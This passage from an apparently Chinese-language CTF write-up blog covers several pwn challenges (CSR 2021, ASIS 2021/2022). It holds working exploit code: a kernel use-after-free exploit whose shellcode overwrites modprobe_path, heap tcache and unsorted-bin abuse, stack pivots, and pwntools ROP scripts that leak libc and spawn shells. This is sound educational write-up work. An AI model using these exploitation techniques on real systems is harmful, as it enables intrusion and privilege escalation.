class="hljs-comment">0xffff98d5cdd2be90:0x000000000088770e0x000000000088770d</span><br><span class="hljs-comment">0xffff98d5cdd2bea0:0x000000000088770c0x000000000088770b</span><br><span class="hljs-comment">0xffff98d5cdd2beb0:0x000000000088770a0x0000000000887709</span><br><span class="hljs-comment">0xffff98d5cdd2bec0:0x0093037d5f064f380x0000000000887707</span><br><span class="hljs-comment">0xffff98d5cdd2bed0:0x00000000008877060x0000000000887705</span><br><span class="hljs-comment">0xffff98d5cdd2bee0:0x00000000008877040x0000000000887703</span><br><span class="hljs-comment">0xffff98d5cdd2bef0:0x00000000008877020x0000000000887701</span><br><span class="hljs-comment">0xffff98d5cdd2bf00:0x00000000000000000x0000000000000000</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> target_area_size 0x1000000</span><br><span class="hljs-keyword">size_t</span> cushion[target_area_size];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// size_t kernel_heap = strtoull(argv[1],0,16);    // input RBX by hand</span><br>    leak(); <span class="hljs-comment">// change to better way for leak</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">node</span> =</span> &#123;<br>        .id = <span class="hljs-number">0xffffffffffff</span>,<br>        .refcount = <span class="hljs-number">0</span>,<br>        .state_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .finalized = <span class="hljs-number">1</span>,<br>        .nb_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .num_edges = <span class="hljs-number">1</span>,<br>        .link_header.fd = <span class="hljs-number">0x1111</span>,<br>        .link_header.bk = <span class="hljs-number">0x2222</span>,<br>        .index = <span class="hljs-number">0x6666</span>,<br>        .tra = <span class="hljs-number">0</span>,<br>    &#125;;<br><br>    <span class="hljs-keyword">size_t</span> *fake_node = &amp;node;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        spark_open(i);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x10</span>; ++i)<br>        link(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span> - i, fake_node[<span class="hljs-number">0x10</span> - i]);<br><br>    spark_finalize(<span class="hljs-number">0</span>);<br><br>    spark_open(<span class="hljs-number">20</span>);<br>    spark_open(<span class="hljs-number">21</span>);<br>    spark_open(<span class="hljs-number">22</span>);<br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// link( 20 , 21 , 0x7777777 );      // rip</span><br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">21</span>, shellcode + <span class="hljs-number">4</span>);<br>    spark_close(<span class="hljs-number">21</span>); <span class="hljs-comment">// free node 21</span><br><br>    query(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// overwrite node 21</span><br><br>    spark_finalize(<span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">// get UAF node 21</span><br>    <span class="hljs-keyword">int</span> qid = msg_open();<br>    msg_send(qid, &amp;fake_node, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-keyword">size_t</span> dis_heap_addr = kernel_heap;<br>    dis_heap_addr &amp;= ~(target_area_size - <span class="hljs-number">1</span>);<br>    dis_heap_addr -= target_area_size * <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] init heap address of distanse array: %p\n&quot;</span>, dis_heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] cushion addr: %p\n&quot;</span>, cushion);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Searching ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>        cushion[i] = <span class="hljs-number">0x7ffffffffffffff</span>;<br><br>    <span class="hljs-comment">// write to userland</span><br>    <span class="hljs-keyword">size_t</span> addr = ((<span class="hljs-keyword">size_t</span>)cushion - dis_heap_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[+] travsersal addr: %p\n&quot;</span>, addr);<br>    arb_write(qid, addr / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">// find offset</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cushion[i] != <span class="hljs-number">0x7ffffffffffffff</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found at idx:%p content:%p addr:%p\n&quot;</span>, i, cushion[i], &amp;cushion[i]);<br>            dis_heap_addr += i * <span class="hljs-number">8</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] dis_heap_addr: %p\n&quot;</span>, dis_heap_addr);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// overwrite the ret address to shellcode().</span><br>    <span class="hljs-keyword">size_t</span> kernel_ret_addr = kernel_stack + <span class="hljs-number">0xa0</span>;<br>    arb_write(qid, (kernel_ret_addr - dis_heap_addr) / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov rdi, [rsp+0x10];&quot;</span><br>        <span class="hljs-string">&quot;add rdi, 0x11b2097;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, 0x792f706d742f;&quot;</span> <span class="hljs-comment">// &quot;/tmp/y&quot;</span><br>        <span class="hljs-string">&quot;mov [rdi], rsi;&quot;</span>          <span class="hljs-comment">// modprobe_path</span><br>        <span class="hljs-string">&quot;ud2;&quot;</span> ::<br>            :);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="CSR-2021"><a href="#CSR-2021" class="headerlink" title="CSR 2021"></a>CSR 2021</h1><h2 id="getstat"><a href="#getstat" class="headerlink" title="getstat"></a>getstat</h2><blockquote><p>CSR 2021</p><p>这个比赛的pwn题好少, 就做个样子. 反而是cry(???)和ethereum较多. 而rev这种还有一题是unity背景, 这个也是不会的…..</p><p>不过看了别人的wp还是挺有趣的. </p></blockquote><p>比较简单, 直接提供shell()函数, 而且PIE. 有canary, 但是没有方法可以leak. 于是就得绕过. 覆盖返回地址.</p><p>主要的问题是无符号数输入加上这段:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401109                 lea     rax, [rdx*8]<br>.text:0000000000401111                 and     rax, 0FFFFFFFFFFFFFFF0h<br>.text:0000000000401115                 sub     rsp, rax<br></code></pre></div></td></tr></table></figure><p>如果rdx是负数(一致性), 那么rsp减去负数就会增加, 导致栈<strong>收缩</strong>. </p><p>直接把rsp收缩到返回地址附近, 此时再覆盖地址即可. </p><p>唯一一个新问题是在python中把整数pack成浮点数. 新的方法如下:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">Functions to convert between Python values <span class="hljs-keyword">and</span> C structs.<br>The optional first format <span class="hljs-keyword">char</span> indicates byte order, size <span class="hljs-keyword">and</span> alignment:<br>    @: native order, <span class="hljs-function">size &amp; <span class="hljs-title">alignment</span> <span class="hljs-params">(<span class="hljs-keyword">default</span>)</span></span><br><span class="hljs-function">    </span>=: native order, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &lt;: little-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &gt;: big-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    !: same as &gt;<br><br>The remaining chars indicate types of args <span class="hljs-keyword">and</span> must match exactly;<br>these can be preceded by a decimal repeat count:<br>    x: <span class="hljs-function">pad <span class="hljs-title">byte</span> <span class="hljs-params">(no data)</span></span>; c:<span class="hljs-keyword">char</span>; b:<span class="hljs-keyword">signed</span> byte; B:<span class="hljs-keyword">unsigned</span> byte;<br>    ?: <span class="hljs-built_in">_Bool</span> (<span class="hljs-keyword">requires</span> C99; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">char</span> is used instead)<br>    h:<span class="hljs-keyword">short</span>; H:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>; i:<span class="hljs-keyword">int</span>; I:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>;<br>    l:<span class="hljs-keyword">long</span>; L:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>; f:<span class="hljs-keyword">float</span>; d:<span class="hljs-keyword">double</span>; e:half-<span class="hljs-keyword">float</span>.<br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(preceding decimal count indicates length)</span>:</span><br><span class="hljs-function">    s:<span class="hljs-title">string</span> <span class="hljs-params">(<span class="hljs-built_in">array</span> of <span class="hljs-keyword">char</span>)</span></span>; p: <span class="hljs-function">pascal <span class="hljs-title">string</span> <span class="hljs-params">(with count byte)</span>.</span><br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(only available in native format)</span>:</span><br><span class="hljs-function">    n:<span class="hljs-keyword">ssize_t</span></span>; N:<span class="hljs-keyword">size_t</span>;<br>    P:an integer type that is wide enough to hold a pointer.<br><span class="hljs-function">Special <span class="hljs-title">case</span> <span class="hljs-params">(<span class="hljs-keyword">not</span> in native mode unless <span class="hljs-string">&#x27;long long&#x27;</span> in platform C)</span>:</span><br><span class="hljs-function">    q:<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span></span>; Q:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span><br>Whitespace between formats is ignored.<br></code></pre></div></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br>  <br>addr = <span class="hljs-number">0x401360</span><br><br>r = process(<span class="hljs-string">&#x27;./getstat&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;-10&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(iToF(addr)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.clean())<br></code></pre></div></td></tr></table></figure><hr><p>SSE instructions: </p><ul><li></li></ul><p>注意的点:</p><ul><li>分支分析, 就比如这个输入不符合浮点数的输入就会break. </li><li>无符号和有符号运算的一致性…</li></ul><h2 id="CSRunner"><a href="#CSRunner" class="headerlink" title="CSRunner"></a>CSRunner</h2><p>图一乐.</p><ul><li><a href="https://en.wikipedia.org/wiki/Common_Language_Infrastructure">Common Language Infrastructure</a> (CLI)</li><li>IL2CPP</li></ul><h1 id="ASIS-CTF-2021"><a href="#ASIS-CTF-2021" class="headerlink" title="ASIS CTF 2021"></a>ASIS CTF 2021</h1><h2 id="Justpwnit"><a href="#Justpwnit" class="headerlink" title="Justpwnit"></a>Justpwnit</h2><p>no canary PIE. </p><p>输入一个负数, 然后覆盖rbp为堆指针, 最终stack pivot到heap上, 最后执行<code>exec(&quot;/bin/sh\x00&quot;, NULL, NULL)</code> </p><p>还在纠结system/read&amp;write/sendfile的时候发现还可以用<code>mov qword ptr [rax], rsi ; ret</code>来把/bin/sh写入bss段….</p><h2 id="Abbr"><a href="#Abbr" class="headerlink" title="Abbr"></a>Abbr</h2><blockquote><p>同上, 分数71, 应该是难一点点</p></blockquote><ul><li><code>strncasecmp</code>: compare two strings ignoring case. </li></ul><p>注意下stack pivot还可用xchg指令…. 可以刚好找到xchg esp, eax. 又因为PIE已关, 所以4字节能够装下bss和heap段的地址. </p><p>不过看到另一个exp里确实绕了一大圈使用了printf的任意读能力leak出地址. 有点复杂了. </p><h2 id="strvec"><a href="#strvec" class="headerlink" title="strvec"></a>strvec</h2><blockquote><p>github <a href="https://github.com/kam1tsur3/2021_CTF/tree/master/asis/pwn/strvec">src</a>, 114 points</p></blockquote><p>找漏洞的过程完全就是一个人脑fuzzing…</p><p>保护全开. 大体思路仍来自别人的wp….</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>好了, 是下面代码的一个整数溢出, 可以做到一个很大的vec-&gt;size以及很小的malloc(size)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-built_in">vector</span> *<span class="hljs-title">vector_new</span><span class="hljs-params">(<span class="hljs-keyword">int</span> nmemb)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (nmemb &lt;= <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">int</span> size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">vector</span>) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">void</span>*) * nmemb;    <span class="hljs-comment">//8+8*n = 8*(n+1)</span><br>                                                        <span class="hljs-comment">//0x40000004</span><br>  <span class="hljs-built_in">vector</span> *vec = (<span class="hljs-built_in">vector</span>*)<span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> (!vec)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">memset</span>(vec, <span class="hljs-number">0</span>, size);<br>  vec-&gt;size = nmemb;<br>  <span class="hljs-keyword">return</span> vec;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样的话get和set两个函数在一定范围内都没有了限制, 不过只能get heap段之后的地址区域. 好像只有heap了…</p><h3 id="Leak-heap-address"><a href="#Leak-heap-address" class="headerlink" title="Leak heap address"></a>Leak heap address</h3><p>到现在get了一个arbitrary read. 可以leak一下堆地址, 方法是通过get已释放的chunk的tcache链表指针. </p><p>然后呢?不知道了, 卡了半天, 没想到经验是如此的不足, 知道下一步是leak libc还是想不出来怎么做. </p><p>好吧现在想出来了, 就是靠伪造一个chunk然后再释放加入unsortedbin中就可以读取fd指针, 从而获得libc_base.</p><h3 id="Arbitrary-write"><a href="#Arbitrary-write" class="headerlink" title="Arbitrary write"></a>Arbitrary write</h3><p>方法是释放tcache struct, 放到unsorted bin中, 方法是先填满0x290大小的tcache链表, 使得再次free tcache struct的时候可以进入unsorted bin, 进而让fd和bk指针覆盖0x30的count变成一个很大的数值, 使得可以在tcache链上malloc任意数量的伪造的tcache fd指针, 最终分配到<code>__malloc_hook</code>, 实现修改下一次malloc时的流程控制.</p><p>卡了一会儿的是差点忘了释放0x420的chunk的时候会尝试前后合并, 而0x421会阻止后向合并, 此时必须设置好nextchunk的nextsize_inuse位, 以阻止前向合并. </p><h3 id="Pop-a-shell"><a href="#Pop-a-shell" class="headerlink" title="Pop a shell"></a>Pop a shell</h3><p>可以使用ROP的方式, 不过有canary的限制, 在此之前还要知道stack和canary的值. </p><p>更简单的方法是使用one_gadget一一检查有无满足对应条件的gadget, 这样只要覆盖malloc_hook到对应gadget地址即可.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./strvec.elf64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sa=<span class="hljs-keyword">lambda</span> x,y:p.sendafter(x,y)<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;chall.rumble.host&quot;</span>, <span class="hljs-number">5415</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(binary, aslr=<span class="hljs-literal">False</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    ru(<span class="hljs-string">b&#x27;-&gt; &#x27;</span>)<br>    data = p.recvline(<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;[undefined]&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        log.error(<span class="hljs-string">&#x27;get idx:&#123;idx&#125; [undefined]&#x27;</span>)<br>    data = u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span>, data:<span class="hljs-built_in">bytes</span>=<span class="hljs-string">b&#x27;\x00&#x27;</span></span>):</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;data = &#x27;</span>, data[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">0x20</span> <span class="hljs-keyword">else</span> data+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    rl()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initial</span>():</span><br>    sl(<span class="hljs-string">b&#x27;Yogdzewa&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x40000004</span>))<br><br><br>initial()<br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>)<br>chunk1_addr = get(<span class="hljs-number">5</span>)<br>log.success(<span class="hljs-string">f&#x27;data is: 0x<span class="hljs-subst">&#123;chunk1_addr:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x421</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-number">7</span>, flat([chunk1_addr+<span class="hljs-number">0x40</span>, chunk1_addr+<span class="hljs-number">0x40</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        log.success(<span class="hljs-string">f&#x27;idx is: <span class="hljs-subst">&#123;<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">set</span>(<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">set</span>(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#the nextchunk header set</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">1</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br><br>gdb.attach(p)<br><span class="hljs-comment">#this will malloc a chunk first, so that puts a chunk between</span><br><span class="hljs-comment">#top chunk and freed one. Will not get into **consolidate forward**</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br>fd_ptr = get(<span class="hljs-number">6</span>)<br>log.success(<span class="hljs-string">f&#x27;fd_ptr is: 0x<span class="hljs-subst">&#123;fd_ptr:x&#125;</span>&#x27;</span>)<br>libc.address = fd_ptr - <span class="hljs-number">0x1ebbe0</span><br>log.success(<span class="hljs-string">f&#x27;libc_base is: 0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># work-in-progress</span><br><br><br><br><br><br>itt()<br></code></pre></div></td></tr></table></figure><h1 id="ASIS-CTF-2022-QUAL"><a href="#ASIS-CTF-2022-QUAL" class="headerlink" title="ASIS CTF 2022 QUAL"></a>ASIS CTF 2022 QUAL</h1><h2 id="babyscan-1"><a href="#babyscan-1" class="headerlink" title="babyscan-1"></a>babyscan-1</h2><p>非预期解, 因为<code>%0s</code>相当于不限制长度. 而且amlloc不改变rsp, 就是直接对栈进行覆盖. 来自r3kapig. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>r = remote(<span class="hljs-string">&#x27;65.21.255.31&#x27;</span>,<span class="hljs-number">13370</span>)<br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000401433</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&quot;alarm&quot;</span>])+p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])+p64(<span class="hljs-number">0x401130</span>) <span class="hljs-comment"># _start</span><br>r.sendline(payload)<br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-libc.sym[<span class="hljs-string">&quot;alarm&quot;</span>]<br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>ogg = libc_base+<span 